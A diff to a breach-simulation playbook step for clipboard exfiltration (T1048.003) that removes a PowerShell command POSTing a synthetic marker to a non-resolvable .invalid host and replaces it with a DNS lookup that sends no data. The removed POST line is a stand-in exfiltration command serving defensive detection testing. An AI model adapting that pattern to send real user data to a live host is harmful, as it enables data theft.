@@ -127,26 +127,17 @@ steps:
     production_safe: true
     risk: low
     reversible: true
-    blast_radius: "POSTs the synthetic clipboard marker text, which holds no user content, to an RFC-6761 .invalid host. The host cannot resolve, so nothing is delivered. Generates Sysmon EID 22 and EID 3."
+    blast_radius: "Resolves one random RFC-6761 .invalid name. No clipboard data, marker text or payload is sent to any host. Generates one DNS query (Sysmon EID 22)."
     telemetry:
       - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
-      - "DLP: outbound POST of clipboard-shaped text"
     detection:
-      - "DLP/egress: clipboard-shaped text sent to an unknown host — exfil alert expected"
+      - "DLP/egress: no transmission is made; this stage is a resolver check only"
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
-      $target = "http://bas-sim-clip-$runId.invalid/upload"
-      $body = "[BAS-SIM] synthetic clipboard marker run=$runId"
-      $reached = $false
-      try {
-        $r = Invoke-WebRequest -Uri $target -Method Post -Body $body -ContentType 'text/plain' -TimeoutSec 10 -UseBasicParsing
-        if ($r.StatusCode) { $reached = $true }
-      } catch { $reached = $false }
-      Write-Output "EXEC T1048.003: attempted to POST the synthetic clipboard marker to $target. reached=$reached (expected: false). Clipboard upload Stage 3. [BAS-SIM-CLP-S3]"
-      if ($reached) {
-        Write-Output "FAIL: Clipboard-shaped text reached an unknown host. DLP is not inspecting outbound text from this process."
-      } else {
-        Write-Output "SKIP: The transfer did not complete, so no DLP or egress control was exercised. A failed .invalid lookup is not evidence of prevention, so no PASS is claimed. Clipboard upload Stage 3. [BAS-SIM-CLP-S3]"
-      }
+      $name = "bas-sim-clip-$runId.invalid"
+      $resolved = $false
+      try { $null = Resolve-DnsName -Name $name -Type A -ErrorAction Stop; $resolved = $true } catch { $resolved = $false }
+      Write-Output "EXEC T1048.003: resolver probe for $name. No data was sent. resolved=$resolved (expected: false). Clipboard upload Stage 3. [BAS-SIM-CLP-S3]"
+      Write-Output "SKIP: No transmission was made, so no DLP or egress control was exercised. A resolver result is not evidence of prevention, so no PASS is claimed. Clipboard upload Stage 3. [BAS-SIM-CLP-S3]"
     cleanup: ""
